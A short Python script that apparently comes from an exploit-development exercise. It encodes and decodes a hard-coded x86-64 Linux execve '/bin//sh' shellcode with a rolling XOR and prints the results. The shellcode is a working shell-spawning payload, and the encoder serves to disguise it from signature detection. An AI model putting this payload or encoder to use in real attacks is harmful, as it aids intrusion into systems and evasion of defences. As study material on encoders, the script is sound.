from pprint import pprint

#all_hex = [hex(i) for i in range(256)]  # [0x0 ... 0xff]



def rolling_xor(data, decrypt=False):
    """ Perform a rolling xor encryption scheme on `data`.

    :param data: bytes object; data to be [en,de]crypted
    :param decrypt: boolean, decrypt previously xor'd data
    :return: bytes object
    """
    data = bytearray(data)

    if decrypt:
        data.reverse()
        cipher_stream = bytearray()

        for i, byte in enumerate(data):
            if i == len(data) - 1:
                cipher_stream.append(data[i])  # last byte doesn't need xor'd
            else:
                cipher_stream.append(data[i] ^ data[i + 1])

        cipher_stream.reverse()
    else:
        cipher_stream = bytearray([data.pop(0)])  # first byte left as is in the ciphertext
        for i, byte in enumerate(data):
            cipher_stream.append(byte ^ cipher_stream[i])

    return bytes(cipher_stream)

shellcode = (b"\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05")
#0x48,0x79,0xb9,0xe9,0xa1,0x28,0xca,0x82,0x39,0x16,0x74,0x1d,0x73,0x5c,0x73,0x0,0x68,0x3b,0x73,0xfa,0x1d,0x4d,0x1a,0x52,0xdb,0x3d,0x75,0xf6,0x36,0xd,0x2,0x7

encoded_shellcode = rolling_xor(shellcode)

print(','.join(hex(x) for x in encoded_shellcode))

print(','.join(hex(x) for x in rolling_xor(encoded_shellcode, decrypt=True)))
